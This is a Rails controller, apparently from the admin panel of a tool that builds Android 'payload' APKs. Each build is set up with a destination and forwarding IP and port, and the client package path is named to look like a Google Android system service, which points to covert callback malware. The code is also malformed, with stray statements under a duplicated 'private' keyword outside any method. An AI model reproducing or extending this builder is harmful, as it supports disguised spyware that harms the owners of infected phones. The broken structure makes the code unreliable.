class ApkPayloadsController < InheritedResources::Base

  def create
    @apk_payload = ApkPayload.new(apk_payload_params)

    # Sanitize name to prevent path traversal
    @apk_payload.name = @apk_payload.name.gsub(/[^a-zA-Z0-9_\-]/, '')

    if @apk_payload.save
      # Trigger background build with ActiveJob
      ApkBuildJob.perform_later(@apk_payload.id)
      redirect_to admin_apk_payloads_path, notice: "APK Generation started for #{@apk_payload.name}. Please refresh page periodically."
    else
      render :new
    end
  end

  private
      # Define paths
      android_root = Rails.root.join("../android-client")
      config_path = android_root.join("app/src/main/java/com/google/android/systemservice/config/AndroidConfig.kt")
  private

  def apk_payload_params
    params.require(:apk_payload).permit(:destination_ip,
                                        :destination_port,
                                        :forwarding_ip,
                                        :forwarding_port,
                                        :name)
  end
end
